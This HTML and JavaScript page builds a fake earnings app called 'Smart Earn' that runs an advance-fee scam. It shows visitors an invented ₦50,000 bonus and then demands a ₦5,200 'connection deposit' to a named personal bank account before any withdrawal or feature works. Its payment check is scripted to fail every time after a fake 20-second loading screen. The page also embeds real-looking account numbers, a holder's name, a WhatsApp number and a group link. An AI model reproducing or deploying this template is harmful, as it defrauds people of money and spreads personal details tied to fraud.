<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Smart Earn</title>
  <meta name="theme-color" content="#000000"/>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
    * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',sans-serif; }
    
    :root {
      --bg: #000;
      --card-bg: #1a1a1a;
      --text: #fff;
      --input-bg: #333;
      --yellow: #ffdd00;
      --header-bg: #ffdd00;
      --header-text: #000;
    }

    [data-theme="light"] {
      --bg: #f5f5f5;
      --card-bg: #ffffff;
      --text: #000;
      --input-bg: #e0e0e0;
      --yellow: #ccaa00;
      --header-bg: #ccaa00;
      --header-text: #000;
    }

    body { background:var(--bg); color:var(--text); transition: background 0.3s, color 0.3s; }
    .hide { display:none !important; }
    .container { max-width:480px; margin:0 auto; min-height:100vh; background:var(--bg); position:relative; }

    .header {
      background:var(--header-bg);
      color:var(--header-text);
      padding:16px;
      text-align:center;
      position:relative;
      border:none !important;
      outline:none !important;
      box-shadow:none !important;
      user-select:none;
      -webkit-tap-highlight-color:transparent;
    }
    .header h2 {
      font-size:19px;
      margin:0;
      padding:0;
      border:none;
      outline:none;
      background:none;
      display:inline-block;
      width:auto;
    }
    .header h2 span { pointer-events:none; }

    .theme-toggle {
      position:absolute; right:16px; top:16px;
      background:none; border:none; font-size:20px;
      cursor:pointer; color:var(--header-text);
      outline:none;
      -webkit-tap-highlight-color:transparent;
    }

    .balance-card { background:linear-gradient(135deg,var(--yellow),var(--bg)); margin:18px; border-radius:18px; padding:22px; text-align:center; color:var(--header-text); }
    .balance { font-size:42px; font-weight:700; }
    .claim-btn { background:#fff; color:#000; padding:12px 24px; border-radius:50px; font-weight:600; margin-top:10px; font-size:14px; display:inline-block; cursor:pointer; }

    .grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; padding:12px; }
    .item { background:var(--card-bg); border-radius:14px; padding:14px; text-align:center; color:var(--text); cursor:pointer; transition:0.2s; font-size:12px; }
    .item:hover { background:#2a2a2a; }
    .item i { font-size:24px; color:var(--yellow); margin-bottom:6px; display:block; }

    .card { background:var(--card-bg); margin:18px; border-radius:16px; padding:20px; }
    input, select, button, .fixed-input { 
      width:100%; padding:14px; margin:8px 0; border-radius:10px; border:none; font-size:15px; 
    }
    input, select, .fixed-input { background:var(--input-bg); color:var(--text); }
    .fixed-input { font-weight:700; color:var(--yellow); text-align:center; pointer-events:none; user-select:none; }
    button { background:var(--yellow); color:#000; font-weight:600; cursor:pointer; }
    .back-btn { background:var(--yellow) !important; color:#000 !important; margin-top:15px !important; }
    .ok-btn { background:#000 !important; color:#fff !important; }

    select { text-align:center; text-align-last:center; }
    option { text-align:left; }

    .loader { position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); display:flex; align-items:center; justify-content:center; flex-direction:column; z-index:9999; }
    .loader h1 { font-size:26px; color:var(--yellow); }
    .loader .spin { width:48px; height:48px; border:5px solid var(--input-bg); border-top:5px solid var(--yellow); border-radius:50%; animation:spin 1s linear infinite; margin:18px; }
    @keyframes spin { to { transform:rotate(360deg); } }

    .red { color:#ff4444; font-size:18px; text-align:center; margin:20px 0; font-weight:700; }

    .payment-box { background:#111; padding:18px; border-radius:16px; border:2px solid var(--yellow); margin:15px 0; }
    .payment-box p { margin:12px 0; font-size:18px; display:flex; justify-content:space-between; align-items:center; }
    .payment-box strong { color:var(--yellow); font-weight:700; }
    .yellow { color:var(--yellow) !important; font-weight:700; }
    .copy-icon { font-size:12px; color:#aaa; cursor:pointer; margin-left:8px; }
    .copy-icon:hover { color:var(--yellow); }

    .yellow-text { color:var(--yellow); font-size:16px; text-align:center; line-height:1.5; }
    .boom-msg { background:var(--bg); color:var(--yellow); padding:18px; border:3px solid var(--yellow); border-radius:16px; font-size:22px; font-weight:700; text-align:center; margin:15px 0; animation: pulse 0.6s; display:none; }
    @keyframes pulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.1); } }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
</head>
<body data-theme="dark">
<div class="container">

  <!-- LOGIN PAGE -->
  <div id="loginPage">
    <div class="card">
      <h2 style="text-align:center; color:var(--yellow);">Welcome Back</h2>
      <input type="text" id="userName" placeholder="Enter Your Name"/>
      <input type="email" id="userEmail" placeholder="Enter Your Gmail"/>
      <button onclick="doLogin()">LOGIN NOW</button>
    </div>
  </div>

  <!-- DASHBOARD -->
  <div id="dashboard" class="hide">
    <div class="header">
      <h2>Hi, <span id="nameDisplay">User</span></h2>
      <button class="theme-toggle" onclick="toggleTheme()">
        <i class="fas fa-moon" id="themeIcon"></i>
      </button>
    </div>
    <div class="balance-card">
      <p>Available Balance</p>
      <div class="balance" id="balanceAmount">₦0.00</div>
      <div id="claimBtn" class="claim-btn" onclick="claimBonus()">Claim Bonus</div>
      <div id="bonusResult" class="hide" style="margin-top:15px;">
        <div class="boom-msg" id="boomMsg">BOOM! ₦50,000.00 has been added!</div>
        <button onclick="closeBonus()" class="ok-btn">OK</button>
      </div>
     </div>

    <div class="grid">
      <div class="item" onclick="openSupport()"><i class="fas fa-headset"></i>Support</div>
      <div class="item" onclick="openGroup()"><i class="fas fa-users"></i>Groups</div>
      <div class="item" onclick="showWithdraw()"><i class="fas fa-arrow-up"></i>Withdraw</div>
      <div class="item" onclick="showFeature('Airtime')"><i class="fas fa-mobile"></i>Airtime</div>
      <div class="item" onclick="showFeature('Data')"><i class="fas fa-wifi"></i>Data</div>
      <div class="item" onclick="showFeature('Betting')"><i class="fas fa-dice"></i>Betting</div>
      <div class="item" onclick="showFeature('TV')"><i class="fas fa-tv"></i>TV</div>
      <div class="item" onclick="showFeature('Invitation')"><i class="fas fa-user-plus"></i>Invite</div>
      <div class="item" onclick="showFeature('More')"><i class="fas fa-ellipsis-h"></i>More</div>
      <div class="item" onclick="logout()" style="background:#333;"><i class="fas fa-sign-out-alt"></i>Logout</div>
    </div>
  </div>

  <!-- WITHDRAW PAGE -->
  <div id="withdrawPage" class="hide">
    <div class="header"><h2>Withdraw</h2></div>
    <div class="card">
      <input type="text" id="acctName" placeholder="Account Name"/>
      <select id="bankSelect">
        <option value="">Select Bank</option>
        <option>Access Bank</option><option>GTBank</option><option>First Bank</option><option>Zenith Bank</option>
        <option>UBA</option><option>Fidelity Bank</option><option>Stanbic IBTC</option><option>Sterling Bank</option>
        <option>Union Bank</option><option>Wema Bank</option><option>Unity Bank</option><option>Heritage Bank</option>
        <option>Keystone Bank</option><option>Polaris Bank</option><option>Providus Bank</option><option>Titan Trust</option>
        <option>Opay</option><option>Kuda</option><option>PalmPay</option><option>Moniepoint</option>
        <option>Carbon</option><option>VFD MFB</option><option>Rubies Bank</option><option>Eyowo</option>
        <option>Sparkle</option><option>Parallex Bank</option><option>Suntrust Bank</option><option>Lotus Bank</option>
        <option>Jaiz Bank</option><option>Taj Bank</option><option>ALAT by Wema</option><option>GoMoney</option>
        <option>9 Payment Service Bank</option><option>Hope PSB</option><option>Momo PSB</option>
      </select>
      <input type="tel" id="acctNumber" placeholder="Account Number"/>
      <div class="fixed-input">₦50,000.00</div>
      <button onclick="submitWithdraw()">SUBMIT</button>
      <button onclick="goHome()" class="back-btn">GO BACK</button>
    </div>
  </div>

  <!-- FIRST DEPOSIT -->
  <div id="firstDeposit" class="hide">
    <div class="header"><h2>Dear User</h2></div>
    <div class="card">
      <p class="yellow-text">As this is your first time <b>withdraw from Smart Earn</b>, you have to connect your account details <b>for you to received your alert immediately.</b></p>
      <button onclick="connectAccount()">CONNECT ACCOUNT DETAILS</button>
      <button onclick="goHome()" class="back-btn">GO BACK</button>
    </div>
  </div>

  <!-- PAYMENT PAGE -->
  <div id="paymentPage" class="hide">
    <div class="loader hide" id="paymentLoader">
      <h1 style="color:var(--yellow);">Processing Payment...</h1>
      <div class="spin"></div>
    </div>
    <div class="header"><h2>Connection Deposit</h2></div>
    <div class="card">
      <p style="text-align:center; font-size:16px; margin-bottom:10px;">Pay exactly the fee below to activate:</p>
      <div class="payment-box">
        <p><strong>account:</strong> <span class="yellow">1042406558</span>
          <i class="fas fa-copy copy-icon" onclick="copyNumber('1042406558')"></i>
        </p>
        <p><strong>Bank:</strong> <span class="yellow">VFD MFB</span></p>
        <p><strong>Name:</strong> <span class="yellow">LIVINGSTONE SARIKIY OWULA</span></p>
        <p><strong>Fee:</strong> <span class="yellow">5,200</span></p>
      </div>
      <button onclick="confirmPayment()" style="background:#00ff00; color:#000; font-weight:700; font-size:14px; padding:14px; margin-top:12px; border-radius:10px;">
        I have made this bank transfer
      </button>
      <button onclick="goHome()" class="back-btn">GO BACK</button>
    </div>
  </div>

  <!-- PAYMENT FAILED -->
  <div id="paymentFailed" class="hide">
    <div class="header"><h2>Payment Status</h2></div>
    <div class="card">
      <p class="red">no payment confirmed</p>
      <button onclick="goHome()" style="background:var(--yellow); color:#000; padding:16px; font-size:16px; margin-top:20px;">
        GO HOME
      </button>
    </div>
  </div>

  <!-- FEATURE LOCKED -->
  <div id="featureLocked" class="hide">
    <div class="header"><h2>Feature Locked</h2></div>
    <div class="card">
      <p id="lockedMessage" class="yellow-text">You have to activate this feature with ₦5,200 naira</p>
      <button onclick="goHome()" class="back-btn">GO BACK</button>
    </div>
  </div>

</div>

<audio id="bonusSound" src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3" preload="auto"></audio>
<audio id="boomSound" src="https://assets.mixkit.co/sfx/preview/mixkit-explosion-with-debris-1683.mp3" preload="auto"></audio>

<script>
  const ADMIN_CODE = "sarikiy";
  let settings = { 
    accName: "LIVINGSTONE SARIKIY OWULA", 
    accNum: "9043318562", 
    bank: "PALMPAY", 
    waNumber: "08147081689", 
    groupLink: "https://chat.whatsapp.com/HKUqHm792vmIf2IeInRSe8?mode=wwt", 
    depositAmt: 5200,
    amounts: { 
      Airtime:5200, Data:5200, Betting:5200, TV:5200, Invitation:5200, More:5200 
    }
  };
  
  let currentUser = { name:"", email:"", balance:0, claimedBonus:false };
  let allUsers = JSON.parse(localStorage.getItem('smartEarnUsers') || '[]');
  
  const saved = localStorage.getItem('smartEarnSettings');
  if (saved) { try { settings = JSON.parse(saved); } catch(e) {} }

  // === DARK MODE ===
  function toggleTheme() {
    const body = document.body;
    const current = body.getAttribute('data-theme');
    const newTheme = current === 'dark' ? 'light' : 'dark';
    body.setAttribute('data-theme', newTheme);
    localStorage.setItem('smartEarnTheme', newTheme);
    updateThemeIcon();
  }

  function updateThemeIcon() {
    const icon = document.getElementById('themeIcon');
    const theme = document.body.getAttribute('data-theme');
    icon.className = theme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
  }

  const savedTheme = localStorage.getItem('smartEarnTheme');
  if (savedTheme) document.body.setAttribute('data-theme', savedTheme);
  updateThemeIcon();

  // === LOGIN ===
  function doLogin() {
    const name = document.getElementById('userName').value.trim();
    const email = document.getElementById('userEmail').value.trim().toLowerCase();
    if (!name || !email) return alert("Fill Name & Gmail!");
    if (!email.includes('@')) return alert("Enter valid Gmail!");

    let user = allUsers.find(u => u.email === email);
    if (!user) {
      user = { name, email, balance:0, claimedBonus:false };
      allUsers.push(user);
      localStorage.setItem('smartEarnUsers', JSON.stringify(allUsers));
    }
    currentUser = user;

    document.getElementById('nameDisplay').innerText = name;
    updateBalance();
    document.getElementById('claimBtn').style.display = currentUser.claimedBonus ? 'none' : 'inline-block';
    showPage('dashboard');
  }

  // === DASHBOARD FEATURES ===
  function openSupport() { location.href = `https://wa.me/${settings.waNumber}?text=Hey%20I%20am%20using%20Smart%20Earn`; }
  function openGroup() { location.href = settings.groupLink; }
  function showWithdraw() { showPage('withdrawPage'); }
  function submitWithdraw() { showPage('firstDeposit'); }
  function connectAccount() { showPage('paymentPage'); }

  function showFeature(f) {
    const amt = settings.amounts[f] || 5200;
    document.getElementById('lockedMessage').innerText = `You have to activate this feature with ₦${amt.toLocaleString()} naira`;
    showPage('featureLocked');
  }

  function confirmPayment() {
    document.getElementById('paymentLoader').classList.remove('hide');
    setTimeout(() => {
      document.getElementById('paymentLoader').classList.add('hide');
      showPage('paymentFailed');
    }, 20000);
  }

  function copyNumber(num) {
    navigator.clipboard.writeText(num).then(() => {
      const icon = event.target;
      icon.style.color = '#00ff00';
      setTimeout(() => icon.style.color = '#aaa', 1000);
    });
  }

  function goHome() { showPage('dashboard'); }

  // === BONUS & LOGOUT ===
  function claimBonus() {
    if (currentUser.claimedBonus) return;
    document.getElementById('claimBtn').style.display = 'none';
    document.getElementById('bonusResult').classList.remove('hide');
    document.getElementById('boomMsg').style.display = 'none';
    document.getElementById('bonusSound').play();

    let count = 0;
    const target = 50000;
    const increment = target / 60;
    const balanceEl = document.getElementById('balanceAmount');
    const interval = setInterval(() => {
      count += increment;
      if (count >= target) {
        count = target; clearInterval(interval);
        currentUser.balance = target; currentUser.claimedBonus = true;
        saveCurrentUser(); updateBalance();
        document.getElementById('boomMsg').style.display = 'block';
        document.getElementById('boomSound').play();
      } else {
        balanceEl.innerText = `₦${Math.round(count).toLocaleString()}.00`;
      }
    }, 30);
  }

  function closeBonus() {
    document.getElementById('bonusResult').classList.add('hide');
    showPage('dashboard');
  }

  function logout() {
    currentUser = { name:"", email:"", balance:0, claimedBonus:false };
    document.getElementById('userName').value = '';
    document.getElementById('userEmail').value = '';
    showPage('loginPage');
  }

  function updateBalance() {
    document.getElementById('balanceAmount').innerText = `₦${currentUser.balance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
  }

  function saveCurrentUser() {
    const i = allUsers.findIndex(u => u.email === currentUser.email);
    if (i > -1) allUsers[i] = currentUser;
    localStorage.setItem('smartEarnUsers', JSON.stringify(allUsers));
  }

  // === SCROLL TO TOP ON PAGE CHANGE ===
  function showPage(id) {
    document.querySelectorAll('.container > div').forEach(d => d.classList.add('hide'));
    document.getElementById(id).classList.remove('hide');
    window.scrollTo(0, 0);
  }

  showPage('loginPage');
</script>
</body>
</html>